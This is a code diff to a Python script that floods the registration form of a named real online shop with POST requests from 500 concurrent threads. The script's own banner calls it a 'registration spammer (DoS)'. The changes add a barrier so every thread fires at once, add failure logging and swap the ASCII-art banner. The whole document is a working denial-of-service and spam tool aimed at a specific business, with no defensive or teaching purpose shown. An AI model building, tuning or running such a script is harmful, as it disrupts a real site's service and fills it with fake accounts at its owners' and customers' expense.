@@ -5,6 +5,9 @@ import threading
 import os
 import time
 
+THREADS = 500
+ACTIVE_THREADS = 0
+
 def randomstr(len: int):
     return "".join(random.choice(string.ascii_letters) for x in range(len))
 
@@ -43,31 +46,42 @@ sent = 0
 other = 0
 threads = 0
 def post_req():
-    global sent, other
+    global sent, other, ACTIVE_THREADS
+    ACTIVE_THREADS += 1
+    while ACTIVE_THREADS != THREADS:
+        print("Info> waiting for threads to load")
+        
+        time.sleep(0.5)
     while True:
         r = requests.post("https://www.fizishop.cz/customer/registration/?do=customerRegistrationForm-submit", params=payload)
         if r.status_code == 200:
             sent += 1
-            os.system(f"title Fizishop disabler - S: {sent} O: {other} T: {threads}")
+            os.system(f"title S: {sent} O: {other} T: {threads}")
         else:
+            print(f"Info> failed to post registration request - {r.status_code}")
             other += 1
 
 t = threading.Thread
 
 def printer():
     while True:
+        time.sleep(1)
         os.system("cls")
-        print(f"""
-        Fizinicitel
+        print(f"""                            _       _     _   
+  __ _ _   _  __ _ _   _  | | __ _| |__ | |_ 
+ / _` | | | |/ _` | | | | | |/ _` | '_ \| __|
+| (_| | |_| | (_| | |_| |_| | (_| | |_) | |_ 
+ \__, |\__,_|\__, |\__,_(_)_|\__, |_.__/ \__|
+ |___/       |___/           |___/           
+> fizishop.cz registration spammer (DoS)   
 
-        S> Sent> {sent}
-        O> Other> {other}
-        T> Threads> {threads}""")
-        time.sleep(0.1)
-
+    S - Sent> {sent}
+    O - Other> {other}
+    T - Threads> {threads}""")
+        
 try:
     t(target=printer).start()
-    for x in range(500):
+    for x in range(THREADS):
         t(target=post_req).start()
         threads += 1
 except Exception as err:
